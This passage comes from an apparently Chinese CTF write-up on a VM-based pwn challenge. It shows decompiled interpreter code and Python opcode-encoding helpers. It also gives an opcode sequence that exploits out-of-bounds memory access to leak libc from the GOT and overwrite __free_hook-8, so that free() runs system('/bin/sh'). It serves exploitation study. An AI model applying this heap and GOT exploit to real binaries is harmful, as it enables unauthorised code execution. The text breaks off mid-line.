class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xD0</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xE0</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0xE0</span>        <span class="token punctuation">{</span>          running <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果栈顶为空则退出while循环</span>            <span class="token keyword">return</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"EXIT\n"</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">return</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        running <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"R%d: %X\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>reg<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//依次打印寄存器的值</span>        result <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"HALT\n"</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xC0</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0xC0</span>      <span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>        reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//左移位运算</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0x90u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x90</span>          result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>          reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">&amp;</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//按位与运算</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0xA0u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0xA0</span>          result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>           reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">|</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//按位或运算</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">0x80u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x80</span>          result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>          reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">-</span> reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//减法</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x30</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0x30</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>    reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> memory<span class="token punctuation">[</span>reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//读取内存中的内容到reg</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x30</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">0x50u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x50</span>        <span class="token function">LODWORD</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//读取SP</span>        reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> result <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//SP+1</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result<span class="token punctuation">;</span>        stack<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将寄存器中的值压入栈中</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0x60u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x60</span>        <span class="token operator">--</span>reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//SP降低</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>        reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">[</span>reg<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//读取栈值到寄存器中</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0x40u</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">//最高字节为0x40</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>memory<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//读取内存的值</span>        memory<span class="token punctuation">[</span>reg<span class="token punctuation">[</span>v2<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将寄存器中的值写入内存中</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x10</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0x10</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>    reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>a1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将一个常数存入寄存器</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x20</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//最高字节为0x20</span>  <span class="token punctuation">{</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>reg<span class="token punctuation">;</span>     reg<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>a1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>分析完功能，我们可以发现在读取和写入内存并没有作出限制，存在越界读写漏洞，我们先将opcode封装成函数</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#reg[v4] = reg[v2] + reg[v3]</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = reg[v3] - reg[v2]</span><span class="token keyword">def</span> <span class="token function">sub</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = reg[v2] &amp; reg[v3]</span><span class="token keyword">def</span> <span class="token function">AND</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = reg[v2] | reg[v3]</span><span class="token keyword">def</span> <span class="token function">OR</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = reg[v2] ^ reg[v3]</span><span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = reg[v3] >> reg[v2]</span><span class="token keyword">def</span> <span class="token function">right_shift</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = reg[v3] &lt;&lt; reg[v2]</span><span class="token keyword">def</span> <span class="token function">left_shift</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = memory[reg[v2]]</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#memory[reg[v2]] = reg[v4]</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#reg[v4] = (unsigned __int8)v2</span><span class="token keyword">def</span> <span class="token function">setnum</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>程序的功能理清了，该怎样利用，注意到sendcomment函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">sendcomment</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">free</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>sendcomment会free掉comment[0]中指针指向的chunk，在此之前程序允许我们往comment[0]指向的chunk写入数据，所以我们可以利用越界写将comment[0]指针改写到free_hook-8的位置，然后一次性写入’/bin/sh’+system的地址，这样后面free(comment[0])就会触发system(‘/bin/sh’)</p><p>首先我们需要泄露libc地址，bss段上方一段距离就是got表，我们通过越界读将got表中的libc地址读取到寄存器中，这里需要注意的是，由于寄存器是双字，也就是四字节的，而地址是八字节的，所以我们需要两个寄存器才能存储一个地址</p><p><img src="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/D:%5CHexo%5Csource_posts%5CVMpwn%E5%AD%A6%E4%B9%A0%5C9.jpg" alt="9"></p><p>got表中最后一个是stderr，不过我们不选它来泄露，因为stderr地址的最后两位是00，在这里我们选择stdin来泄露,因为后续我们需要通过stdin的地址来计算得到__free_hook-8,因此尽量选择与free_hook地址相差较小的来泄露,能够减小计算量。</p><p>有了泄露目标之后，就该来计算索引了(reg[v4] = memory[reg[v2]])。memory的地址是0x202060，stdin@got的地址为0x201f80，memory也是双字类型，于是有n=(0x202060-0x201f80)/4=56，索引就是-56</p><p>该如何构造出-56，可以通过在内存中负数的存储方式来构造，0xffffffc8在内存中就表示-56，通过-56读取stdin地址的后四字节，通过-55读取前四个字节。如何得到0xffffffc8，可以通过ff左移位和加法运算得到，构造步骤如下</p><pre class=" language-python"><code class="language-python">setnum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[0]=8</span>setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=0xff</span>setnum<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=0xff</span>left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xff&lt;&lt;8=0xff00)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+reg[1](reg[2]=0xff00+0xff=0xffff)</span>left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffff&lt;&lt;8=0xffff00)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+reg[1](reg[2]=0xffff00+0xff=0xffffff)</span>setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=0xc8</span>left_shift<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffffff&lt;&lt;8=0xffffff00)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+reg[1](reg[2]=0xffffff00+0xc8=0xffffffc8=-56)</span></code></pre><p>然后我们读取stdin的地址，存入两个寄存器中</p><pre class=" language-python"><code class="language-python">read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[3]=memory[reg[2]]=memory[-56]</span>setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=1</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+reg[1]=-56+1=-55</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[4]=memory[reg[2]]=memory[-55]</span></code></pre><p>有了stdin地址之后，我们计算出stdin和free_hook-8的偏移，通过add将偏移加到存储stdin地址的寄存器之上，再写入comment[0]即可，comment[0]与memory的相对索引是-8</p><pre class=" language-python"><code class="language-python">setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=0x10</span>left_shift<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=reg[1]&lt;&lt;8=0x10&lt;&lt;8=0x1000</span>setnum<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[0]=0x90</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=reg[1]+reh[0]=0x1000+0x90=0x1090 &amp;free_hook-8-&amp;stdin=0x1090</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[3]=reg[3]+reg[1]=&amp;stdin后四字节+0x1090=&amp;free_hook-8后四字节</span>setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=47</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+2=-55+47=-8</span>write<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#memory[reg[2]]=memory[-8]=reg[3]</span>setnum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[1]=1</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#reg[2]=reg[2]+1=-8+1=-7</span>write<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#memory[reg[2]]=memory[-7]=reg[4]</span>u32<span class="token punctuation">(</span><span class="token punctuation">(</span>p8<span class="token punctuation">(</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span 